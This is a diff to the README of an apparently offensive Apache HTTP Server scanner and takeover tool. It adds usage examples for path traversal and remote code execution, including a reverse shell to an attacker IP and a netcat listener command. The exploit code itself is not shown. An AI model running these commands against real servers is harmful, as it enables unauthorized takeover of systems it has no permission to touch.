@@ -4,8 +4,6 @@ Apache HTTP Server Scanner and takeover tool with all common CVE's of Apache HTT
 
 run a netcat or whatever listener for the RCE 
 
-To run this Script install the Required pip Modules and define your command by this: 
-
 ```python3 ApacheScanner.py -u http://serveriphere  --rce --cmd "your command here" --lhost <your attacker IP> --lport <Your listening port>``` 
 
 ```
@@ -25,4 +23,17 @@ Options:
   --cmd CMD             Command to run if RCE is enabled (default is whoami)
   --lhost LHOST         Attacker IP for reverse shell (required if --rce is enabled)
   --lport LPORT         Attacker listening port for reverse shell (required if --rce is enabled)
- ```  
+  --insecure            Disable SSL verification (useful for self-signed certs)
+
+# Basic traversal check
+python ApacheScanner.py -u http://target.local -c "id"
+
+# Full RCE attempt (start nc -lvnp 4444 first)
+python ApacheScanner.py -u http://vulnerable-lab:8080 --rce --lhost 192.168.1.50 --lport 4444 --insecure
+
+# Help
+python ApacheScanner.py -h
+
+
+ ```
+
